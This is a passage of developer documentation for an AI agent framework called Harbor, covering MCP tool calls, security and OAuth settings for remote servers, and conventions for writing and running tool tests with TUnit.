    "method":"tools/call",
    "args":{"name":"read_file","arguments":{"path":"/tmp/notes.txt"}}
  }
}
```

For reads, prefer the fixed-schema wrappers over hand-crafted params:

```jsonc
{"tool":"read_mcp_resource","args":{"server":"filesystem","uri":"file:///docs/api.md"}}
{"tool":"mcp_prompt","args":{"server":"dev","name":"code-review"}}
```


### Implementation notes

- `McpRegistry` is registered as the `IMcpRegistry` singleton by
  `Harbor.Hosting.Modules.ToolsCatalog.CreateMcpRegistry` when the host opts into MCP
  (`IncludeMcpTools` + `Full14` tool set). The Avalonia desktop host uses
  `Standard10`, where the registry is an empty `InMemoryMcpRegistry`
  (in `src/Harbor.Registries/Tools/InMemoryMcpRegistry.cs`) so view-models can resolve
  the interface without spawning subprocesses.
- Server instructions are surfaced to the system prompt via
  `IMcpRegistry.GetInstructions()` — from a static `instructions` hint in `mcp.json`
  and the `initialize` response harvested during `InvokeAsync`.
- Per-call lifecycle: each `InvokeAsync` spawns the server process, performs the
  JSON-RPC round-trip, and kills the whole process tree on dispose (job objects on
  Windows, process-group kill elsewhere — see `ProcessTree`).

### Security notes

- Each MCP server runs as a child process with the agent's privileges. Treat server
  registration as a privileged operation — don't auto-load untrusted servers.
- The `mcp` builtin's default permission is `Ask`. Each call surfaces a permission prompt
  until the user persists a decision.
- The `args` field is forwarded verbatim to the server. Validate at the server side.

### OAuth for remote servers

Remote (`url`) entries accept an `auth` block with OAuth2 settings:

```jsonc
{"mcpServers": {"cloud": {
  "url": "https://mcp.example.com/mcp",
  "transport": "http",
  "auth": {
    "clientId": "harbor-cli",          // omit for dynamic registration (RFC7591)
    "scopes": ["mcp:read"],
    "authorizationEndpoint": "https://example.com/oauth/authorize", // else RFC8414 discovery
    "tokenEndpoint": "https://example.com/oauth/token",
    "redirectPort": 0                  // 0 = any free loopback port
  }
}}}
```

Flow: `harbor mcp login <server>` opens the browser (PKCE S256, loopback
redirect), exchanges the code and caches tokens under the harbor home
(`mcp-oauth/`); `harbor mcp logout <server>` drops them. Transports attach the
cached token as `Bearer`, refreshing silently via refresh_token; without a
usable token they fail with a login hint. `HARBOR_MCP_OAUTH_TOKEN` remains as
a static-token fallback when no `auth` block is configured. Unknown `auth`
fields are ignored (forward-compatible).

---

## 10. Testing tools

Test files live in `tests/Harbor.Tools.Builtin.Tests/` and follow the convention
`<Name>ToolTests.cs`. The project uses [TUnit](https://tunit.dev) (pinned in
`Directory.Packages.props`).

### Canonical test structure

```csharp
using System.Text.Json;
using Harbor.Abstractions.Models;
using Harbor.Abstractions.Permissions;
using Harbor.Abstractions.Tools;
using Harbor.TestKit;
using Microsoft.Extensions.Logging.Abstractions;

namespace Harbor.Tools.Builtin.Tests;

public class WebFetchToolTests
{
    [Test]
    public async Task Name_IsWebFetch()
    {
        var tool = NewTool(_ => NewResponse(System.Net.HttpStatusCode.OK, "<p>hi</p>", "text/html"));
        await Assert.That(tool.Name.Value).IsEqualTo("webfetch");
    }

    [Test]
    public async Task ExecuteAsync_FetchesHtml_AndConvertsToMarkdown() { /* ... */ }

    [Test]
    public async Task ExecuteAsync_BinaryContentType_ReturnsError() { /* ... */ }

    private static WebFetchTool NewTool(Func<HttpRequestMessage, HttpResponseMessage> responder)
        => new(NullLogger<WebFetchTool>.Instance, () => new HttpClient(new StubHandler(responder)));
}
```

### Patterns by tool type

| Tool type | Test pattern |
|---|---|
| File-based (`read`, `write`, `edit`, `patch`) | Use `Path.GetTempFileName()` / `Path.GetTempPath()` + unique subdir; clean up in `finally`. |
| HTTP-based (`webfetch`) | Inject a custom `HttpMessageHandler` via the test ctor; never hit the real network. |
| Process-based (`bash`, `ripgrep`) | Use real commands; `Assert.Skip` if the binary isn't installed (see `RipGrepToolTests`). |
| Stateful (`notebook`) | Use the ctor that takes a custom `notesRoot` pointing at a temp dir. |
| DI-dependent (`mcp`, `task`) | Construct with a real (`InMemoryMcpRegistry`, `AgentRegistry`) or mock dependency. |

### Coverage checklist per tool

- [ ] `Name` and `ExecutionMode` sanity
- [ ] `ValidateArguments` — missing required, wrong type, out-of-range
- [ ] Happy path — at least one real call through `ExecuteAsync`
- [ ] Error path — bad input, missing file, network failure, etc.
- [ ] Edge case — empty input, max-size limits, cancellation

### Running tests

```bash
# Just the builtin tool tests (known-good pattern: per-project executable, Release, no rebuild)
dotnet run --project tests/Harbor.Tools.Builtin.Tests -c Release --no-build -- --minimum-expected-tests 1

# One test class — TUnit uses --treenode-filter, not --filter (forwarded after --)
dotnet run --project tests/Harbor.Tools.Builtin.Tests -c Release --no-build -- \
  --treenode-filter "/*/*/WebFetchToolTests/*"
```

> **Known limitation:** `dotnet test` is not used in this repo — every CI job
> runs each test project as a plain executable, one at a time
> (`dotnet run --project tests/<X> -c Release --no-build -- --minimum-expected-tests 1`).
> See [CONTRIBUTING.md §Why not `dotnet test`](../CONTRIBUTING.md#why-not-dotnet-test)
> for the causes; the earlier "discovers zero tests (broken MTP bridge)" wording
> here was wrong.

---

## See also

- [CLAUDE.md](../CLAUDE.md) — code conventions (cross-references this file).
- [AGENTS.md](../AGENTS.md) — operational guide for AI agents (Add-a-tool quickstart).
- [docs/PATTERNS.md](./PATTERNS.md) — Strategy / Registry / Command patterns in the tool layer.
- [docs/EXAMPLES.md](./EXAMPLES.md) — task-oriented recipes.
- [docs/PLUGIN_DEVELOPMENT.md](./PLUGIN_DEVELOPMENT.md) — Roslyn `.cs` plugin system for tools that aren't builtins.
- [docs/SCRIPTING.md](./SCRIPTING.md) — JS/TS script-registered tools (lighter-weight than .cs plugins).
- [specs/04-tools.md](./specs/04-tools.md) — original tool spec.
- [specs/06-mcp.md](./specs/06-mcp.md) — MCP spec.
